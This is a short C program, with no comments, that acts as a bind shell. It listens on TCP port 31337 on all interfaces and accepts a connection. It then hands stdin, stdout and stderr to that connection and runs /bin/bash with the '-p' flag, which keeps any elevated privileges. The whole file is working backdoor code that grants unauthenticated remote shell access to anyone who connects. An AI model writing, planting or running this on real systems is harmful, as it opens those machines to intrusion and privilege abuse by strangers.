#include <stddef.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(){
	int sockfd, confd;
	char *argv[] = {"bash", "-p", NULL}; 
	struct sockaddr_in addr = {0};

	sockfd = socket(AF_INET, SOCK_STREAM, 0); 

	addr.sin_family = AF_INET;
	addr.sin_port = htons(31337);
	addr.sin_addr.s_addr = INADDR_ANY;

	bind(sockfd, (struct sockaddr*)&addr, sizeof(addr));

	listen(sockfd, 3);
	confd = accept(sockfd, NULL, NULL);

	dup2(confd, 0);
	dup2(confd, 1);
	dup2(confd, 2);

	execv("/bin/bash", argv);
	return 0;
}
